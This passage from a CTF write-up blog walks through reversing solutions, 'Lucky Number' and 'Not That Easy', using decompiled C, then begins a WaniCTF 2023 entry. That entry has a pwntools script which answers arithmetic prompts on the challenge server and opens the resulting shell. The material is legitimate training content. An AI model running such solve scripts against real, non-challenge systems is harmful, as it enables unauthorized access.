class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">long</span> expected;</span><br><span class="line">  <span class="type">long</span> input;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  expected = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; _                _            _   _                 _                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |              | |          | \\ | |               | |               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |    _   _  ___| | ___   _  |  \\| |_   _ _ __ ___ | |__   ___ _ __  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |   | | | |/ __| |/ / | | | | . ` | | | | \&#x27;_ ` _ \\| \&#x27;_ \\ / _ \\ \&#x27;__| &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |___| |_| | (__|   &lt;| |_| | | |\\  | |_| | | | | | | |_) |  __/ |    &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\\_____/\\__,_|\\___|_|\\_\\__, | \\_| \\_/\\__,_|_| |_| |_|_.__/ \\___|_|    &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;                        __/ |                                         &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;                       |___/                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a number to check if its a lucky number: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00102280,&amp;input);</span><br><span class="line">  input = doSomething(input);</span><br><span class="line">  luckyNumberGen(&amp;expected);</span><br><span class="line">  <span class="keyword">if</span> (expected == input) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wow ! You guessed the lucky number.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now submit the lucky number to get your points&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Damn ! You are unlucky like me :( &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>user input is being stored in <strong>input</strong> variable </li><li><code>doSomething</code> function being called with <strong>input</strong> as arg</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">doSomething</span><span class="params">(ulong param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ulong i;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = param_1; i != <span class="number">0</span>; i = i / <span class="number">10</span>) &#123;</span><br><span class="line">    local_10 = local_10 * <span class="number">10</span> + i % <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> local_10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>the purpose of this function is to reverse the digits of the input unsigned long integer param_1 and return the result as a long integer. For example, if the input is 123, the function will return 321.</p><p>then <code>luckyNumberGen</code> function with <strong>expected</strong> variable as a arg, lets see</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">luckyNumberGen</span><span class="params">(<span class="type">long</span> *param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  <span class="type">long</span> local_28;</span><br><span class="line">  <span class="type">long</span> local_20;</span><br><span class="line">  ulong i;</span><br><span class="line">  </span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_20 = <span class="number">1</span>;</span><br><span class="line">  *param_1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    *param_1 = *param_1 + local_28;</span><br><span class="line">    lVar1 = local_20 + local_28;</span><br><span class="line">    local_28 = local_20;</span><br><span class="line">    local_20 = lVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>the purpose of this code is to generate the first 50 numbers of the Fibonacci sequence and store the sum of these numbers in the memory location pointed to by <code>param_1</code>. </p><p>okay, lets see the output of this function</p><p><img src="/imgs/post5/rev/luckynumFunc.png" alt="luckynumFunc.png"></p><p>hmm got it, now we know our input have to go through <code>doSomething</code> function that reverse the user input.</p><p>we can also see this in run time while debugging </p><p><img src="/imgs/post5/rev/lucky_number.gif" alt="lucky_number.gif"></p><p>it means we have to enter this number in reverse order</p><p><img src="/imgs/post5/rev/lucky_number.png" alt="lucky_number.png"></p><h3 id="Not-That-Easy"><a href="#Not-That-Easy" class="headerlink" title="Not That Easy"></a>Not That Easy</h3><p>this one was quite tricky i solved it after CTF</p><h4 id="main-func-3"><a href="#main-func-3" class="headerlink" title="main func"></a>main func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_94;</span><br><span class="line">  undefined4 local_8d;</span><br><span class="line">  undefined2 local_89;</span><br><span class="line">  undefined4 local_87;</span><br><span class="line">  undefined3 uStack131;</span><br><span class="line">  undefined8 local_80;</span><br><span class="line">  undefined8 local_78;</span><br><span class="line">  undefined8 local_70;</span><br><span class="line">  undefined4 local_68;</span><br><span class="line">  undefined8 local_58;</span><br><span class="line">  undefined7 local_50;</span><br><span class="line">  undefined uStack73;</span><br><span class="line">  undefined7 uStack72;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined2 local_30;</span><br><span class="line">  undefined6 uStack46;</span><br><span class="line">  undefined2 uStack40;</span><br><span class="line">  undefined8 local_26;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_8d = <span class="number">0x756e654d</span>;</span><br><span class="line">  local_89 = <span class="number">0x3a</span>;</span><br><span class="line">  local_58 = <span class="number">0x6568746f4d202e31</span>;</span><br><span class="line">  local_50 = <span class="number">0x206472616f6272</span>;</span><br><span class="line">  uStack73 = <span class="number">0x56</span>;</span><br><span class="line">  uStack72 = <span class="number">0x6e6f69737265</span>;</span><br><span class="line">  local_87 = <span class="number">0x52202e32</span>;</span><br><span class="line">  uStack131 = <span class="number">0x4d41</span>;</span><br><span class="line">  local_78 = <span class="number">0x617265704f202e33</span>;</span><br><span class="line">  local_70 = <span class="number">0x73795320676e6974</span>;</span><br><span class="line">  local_68 = <span class="number">0x6d6574</span>;</span><br><span class="line">  local_80 = <span class="number">0x67616c46202e34</span>;</span><br><span class="line">  local_38 = <span class="number">0x6f79207265746e45</span>;</span><br><span class="line">  local_30 = <span class="number">0x7275</span>;</span><br><span class="line">  uStack46 = <span class="number">0x63696f686320</span>;</span><br><span class="line">  uStack40 = <span class="number">0x2065</span>;</span><br><span class="line">  local_26 = <span class="number">0x203a7d342d317b</span>;</span><br><span class="line">  banner(&amp;local_8d,&amp;local_58,&amp;local_87,&amp;local_78,&amp;local_80,&amp;local_38);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00102359,&amp;local_94);</span><br><span class="line">  <span class="keyword">if</span> (local_94 == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not that easy :P&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LAB_00101898;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_94 &lt; <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (local_94 == <span class="number">3</span>) &#123;</span><br><span class="line">      getOperatingSystem();</span><br><span class="line">      <span class="keyword">goto</span> LAB_00101898;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (local_94 &lt; <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (local_94 == <span class="number">1</span>) &#123;</span><br><span class="line">        getMotherboardVersion();</span><br><span class="line">        <span class="keyword">goto</span> LAB_00101898;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (local_94 == <span class="number">2</span>) &#123;</span><br><span class="line">        getRAM();</span><br><span class="line">        <span class="keyword">goto</span> LAB_00101898;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">LAB_00101898:</span><br><span class="line">  <span class="keyword">if</span> (local_10 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>we don’t see any function that we should start reversing in <code>main</code> function as i ignored <code>banner</code> one thinking it should be used only for printing banner arts </p><p>but as we can see it being called with some local variable argument that holds some hex value, if we see <code>banner</code> function </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span></span><br><span class="line"> <span class="number">2</span><span class="type">void</span> <span class="title function_">banner</span><span class="params">(<span class="type">char</span> *param_1,<span class="type">char</span> *param_2,<span class="type">char</span> *param_3,<span class="type">char</span> *param_4,<span class="type">char</span> *param_5,<span class="type">long</span> param_6)</span></span><br><span class="line"> 3</span><br><span class="line"> 4&#123;</span><br><span class="line"> <span class="number">5</span>  <span class="type">int</span> iVar1;</span><br><span class="line"> <span class="number">6</span>  <span class="type">time_t</span> tVar2;</span><br><span class="line"> <span class="number">7</span>  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line"> <span class="number">8</span>  <span class="type">char</span> local_38 [<span class="number">4</span>];</span><br><span class="line"> <span class="number">9</span>  undefined local_34;</span><br><span class="line"><span class="number">10</span>  undefined local_33;</span><br><span class="line"><span class="number">11</span>  undefined local_32;</span><br><span class="line"><span class="number">12</span>  <span class="type">char</span> local_31;</span><br><span class="line"><span class="number">13</span>  <span class="type">char</span> local_30;</span><br><span class="line"><span class="number">14</span>  <span class="type">char</span> local_2f;</span><br><span class="line"><span class="number">15</span>  undefined local_2e;</span><br><span class="line"><span class="number">16</span>  <span class="type">char</span> local_2d;</span><br><span class="line"><span class="number">17</span>  <span class="type">char</span> local_2c;</span><br><span class="line"><span class="number">18</span>  <span class="type">char</span> local_2b;</span><br><span class="line"><span class="number">19</span>  undefined local_2a;</span><br><span class="line"><span class="number">20</span>  undefined local_29;</span><br><span class="line"><span class="number">21</span>  <span class="type">char</span> local_28;</span><br><span class="line"><span class="number">22</span>  <span class="type">char</span> local_27;</span><br><span class="line"><span class="number">23</span>  undefined local_26;</span><br><span class="line"><span class="number">24</span>  undefined local_25;</span><br><span class="line"><span class="number">25</span>  <span class="type">long</span> local_10;</span><br><span class="line"><span class="number">26</span>  </span><br><span class="line"><span class="number">27</span>  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line"><span class="number">28</span>  <span class="built_in">puts</span>(<span class="string">&quot;  _   _       _     _______ _           _     ______                &quot;</span>);</span><br><span class="line"><span class="number">29</span>  <span class="built_in">puts</span>(<span class="string">&quot; | \\ | |     | |   |__   __| |         | |   |  ____|               &quot;</span>);</span><br><span class="line"><span class="number">30</span>  <span class="built_in">puts</span>(<span class="string">&quot; |  \\| | ___ | |_     | |  | |__   __ _| |_  | |__   __ _ ___ _   _ &quot;</span>);</span><br><span class="line"><span class="number">31</span>  <span class="built_in">puts</span>(<span class="string">&quot; | . ` |/ _ \\| __|    | |  | \&#x27;_ \\ / _` | __| |  __| / _` / __| | | |&quot;</span>);</span><br><span class="line"><span class="number">32</span>  <span class="built_in">puts</span>(<span class="string">&quot; | |\\  | (_) | |_     | |  | | | | (_| | |_  | |___| (_| \\__ \\ |_| |&quot;</span>);</span><br><span class="line"><span class="number">33</span>  <span class="built_in">puts</span>(<span class="string">&quot; |_| \\_|\\___/ \\__|    |_|  |_| |_|\\__,_|\\__| |______\\__,_|___/\\__, |&quot;</span>);</span><br><span class="line"><span class="number">34</span>  <span class="built_in">puts</span>(<span class="string">&quot;                                                               __/ |&quot;</span>);</span><br><span class="line"><span class="number">35</span>  <span class="built_in">puts</span>(<span class="string">&quot; A useless program developed by NomanProdhan                  |___/ &quot;</span>);</span><br><span class="line"><span class="number">36</span>  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="number">37</span>  <span class="built_in">puts</span>(param_1);</span><br><span class="line"><span class="number">38</span>  <span class="built_in">puts</span>(param_2);</span><br><span class="line"><span class="number">39</span>  local_2e = *(undefined *)(param_6 + <span class="number">1</span>);</span><br><span class="line"><span class="number">40</span>  <span class="built_in">puts</span>(param_3);</span><br><span class="line"><span class="number">41</span>  local_27 = local_2e;</span><br><span class="line"><span class="number">42</span>  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_2[<span class="number">9</span>]);</span><br><span class="line"><span class="number">43</span>  local_38[<span class="number">1</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">44</span>  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_2[<span class="number">9</span>]);</span><br><span class="line"><span class="number">45</span>  local_38[<span class="number">0</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">46</span>  <span class="built_in">puts</span>(param_4);</span><br><span class="line"><span class="number">47</span>  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_2[<span class="number">5</span>]);</span><br><span class="line"><span class="number">48</span>  local_38[<span class="number">1</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">49</span>  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_4[<span class="number">0xd</span>]);</span><br><span class="line"><span class="number">50</span>  local_38[<span class="number">2</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">51</span>  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_2[<span class="number">7</span>]);</span><br><span class="line"><span class="number">52</span>  local_38[<span class="number">3</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">53</span>  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)*(<span class="type">char</span> *)(param_6 + <span class="number">0xb</span>));</span><br><span class="line"><span class="number">54</span>  local_34 = (undefined)iVar1;</span><br><span class="line"><span class="number">55</span>  <span class="built_in">puts</span>(param_5);</span><br><span class="line"><span class="number">56</span>  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)*(<span class="type">char</span> *)(param_6 + <span class="number">0x12</span>));</span><br><span class="line"><span class="number">57</span>  local_33 = (undefined)iVar1;</span><br><span class="line"><span class="number">58</span>  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_4[<span class="number">3</span>]);</span><br><span class="line"><span class="number">59</span>  local_32 = (undefined)iVar1;</span><br><span class="line"><span class="number">60</span>  local_31 = param_2[<span class="number">4</span>];</span><br><span class="line"><span class="number">61</span>  local_29 = local_38[<span class="number">3</span>];</span><br><span class="line"><span class="number">62</span>  local_30 = param_4[<span class="number">4</span>];</span><br><span class="line"><span class="number">63</span>  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)*(<span class="type">char</span> *)(param_6 + <span class="number">0x16</span>));</span><br><span class="line"><span class="number">64</span>  local_25 = (undefined)iVar1;</span><br><span class="line"><span class="number">65</span>  local_2f = param_2[<span class="number">0x12</span>];</span><br><span class="line"><span class="number">66</span>  local_2e = *(undefined *)(param_6 + <span class="number">0x14</span>);</span><br><span class="line"><span class="number">67</span>  local_2d = *param_2;</span><br><span class="line"><span class="number">68</span>  local_2c = param_4[<span class="number">8</span>];</span><br><span class="line"><span class="number">69</span>  local_28 = param_3[<span class="number">4</span>];</span><br><span class="line"><span class="number">70</span>  local_2b = param_4[<span class="number">0xd</span>];</span><br><span class="line"><span class="number">71</span>  local_2a = local_2e;</span><br><span class="line"><span class="number">72</span>  local_27 = local_2f;</span><br><span class="line"><span class="number">73</span>  iVar1 = <span class="built_in">toupper</span>((<span class="type">int</span>)param_2[<span class="number">0xd</span>]);</span><br><span class="line"><span class="number">74</span>  local_38[<span class="number">1</span>] = (<span class="type">char</span>)iVar1;</span><br><span class="line"><span class="number">75</span>  local_26 = *(undefined *)(param_6 + <span class="number">6</span>);</span><br><span class="line"><span class="number">76</span>  tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line"><span class="number">77</span>  srand((uint)tVar2);</span><br><span class="line"><span class="number">78</span>  iVar1 = rand();</span><br><span class="line"><span class="number">79</span>  <span class="built_in">printf</span>(<span class="string">&quot;Today\&#x27;s Lucky Number : %d\n&quot;</span>,(ulong)(uint)(local_38[iVar1 % <span class="number">0x13</span>] * <span class="number">2</span>));</span><br><span class="line"><span class="number">80</span>  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,param_6);</span><br><span class="line"><span class="number">81</span>  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line"><span class="number">82</span>                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line"><span class="number">83</span>    __stack_chk_fail();</span><br><span class="line"><span class="number">84</span>  &#125;</span><br><span class="line"><span class="number">85</span>  <span class="keyword">return</span>;</span><br><span class="line"><span class="number">86</span>&#125;</span><br></pre></td></tr></table></figure><p>initially parameter’s value being passed to local variables thinking that these all should be pieces of flag i run the debugger and start looking for any interesting string and indeed i got the flag</p><p><img src="/imgs/post5/rev/not_that_easy.png" alt="not_that_easy.png"></p><p>in action </p><p><img src="/imgs/post5/rev/not_that_easy.gif" alt="not_that_easy.gif"></p><p>i’ll continue writing rest later 🥱</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> reversing </tag>
            
            <tag> misc </tag>
            
            <tag> OSINT </tag>
            
            <tag> networking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF WriteUp: WaniCTF 2023</title>
      <link href="/2023/06/08/post4/wanictf_2023/"/>
      <url>/2023/06/08/post4/wanictf_2023/</url>
      
        <content type="html"><![CDATA[<p><img src="/imgs/post4/front.png" alt="front"></p><p>Over this weekend i played WaniCTF it was beginner freindly CTF where i solved some challenges over there ……………………</p><p>All challenges can be found <a href="https://github.com/Durge5h/CTFs/tree/main/Competition/WaniCTF-2023">here</a></p><h2 id="Pwnable"><a href="#Pwnable" class="headerlink" title="Pwnable"></a>Pwnable</h2><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><blockquote><p>-&gt; First, let’s challenge the displayed arithmetic problem.<br>-&gt; After clearing the arithmetic problem, a new shell will be launched. There is no need to panic even if nothing is displayed on the screen. Try entering a command you know (such as <code>ls</code> or <code>cat</code>).</p></blockquote><p>wasted more time than needed on this POS. thought, have to loop 100 times by evaluting the answer as it prompt “remaining 100 challenges” instead of manually answering the answer three time i wouldn’t if i have read hint given </p><p><img src="/imgs/post4/pwn/netcat.gif" alt="netcat"></p><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;netcat-pwn.wanictf.org&quot;,9001)</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process() </span></span><br><span class="line">r = remote(<span class="string">&quot;netcat-pwn.wanictf.org&quot;</span>,<span class="number">9001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvline()</span><br><span class="line">        r.recvline()</span><br><span class="line">        data = r.recv().decode()</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        equ = re.search(<span class="string">r&quot;\d+\s*\+\s*\d+&quot;</span>,data) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;equ :&quot;</span>,equ)</span><br><span class="line">        ans = <span class="built_in">eval</span>(<span class="built_in">str</span>(equ.group()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ans : &quot;</span>,ans)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.interactive() </span><br></pre></td></tr></table></figure><h3 id="only-once"><a href="#only-once" class="headerlink" title="only once"></a>only once</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><blockquote><p>In the pwn category, it is common for the problem server to distribute executable files and their source code. How does it differ from the source code of “netcat”?</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">rand_gen</span><span class="params">()</span> &#123; <span class="keyword">return</span> rand() % <span class="number">1000</span>; &#125;</span><br><span 